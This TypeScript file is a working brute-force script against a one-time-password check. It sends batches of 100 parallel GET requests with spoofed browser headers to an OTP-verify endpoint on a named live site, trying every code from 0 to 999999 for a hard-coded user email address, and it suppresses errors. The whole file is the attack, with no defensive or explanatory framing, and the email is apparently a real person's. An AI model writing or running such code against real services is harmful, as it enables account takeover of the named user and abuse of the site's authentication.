import axios from 'axios';

async function sendRequest(otp: string) {

let config = {
  method: 'get',
  maxBodyLength: Infinity,
  url: 'https://harkiratapi.classx.co.in/get/otpverify?useremail=jyotiradityabiswal64%40gmail.com&otp=' + otp,
  headers: { 
    'accept': '*/*', 
    'accept-language': 'en-US,en;q=0.9,hi;q=0.8', 
    'auth-key': 'appxapi', 
    'client-service': 'Appx', 
    'device-type': '', 
    'origin': 'https://harkirat.classx.co.in', 
    'priority': 'u=1, i', 
    'referer': 'https://harkirat.classx.co.in/', 
    'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"', 
    'sec-ch-ua-mobile': '?0', 
    'sec-ch-ua-platform': '"Windows"', 
    'sec-fetch-dest': 'empty', 
    'sec-fetch-mode': 'cors', 
    'sec-fetch-site': 'same-site', 
    'source': 'website', 
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36'
  }
};

    try {
        await axios.request(config)
    } catch(e) {
        // console.log(e);
    }
    
}

async function main() {
    for(let i = 0; i <= 999999; i+=100) {

    const p = [];
    console.log(i);
    for(let j = 0; j < 100; j++) {
        p.push(sendRequest((i+j).toString()));
    }
    await Promise.all(p);
    
    }
}


main();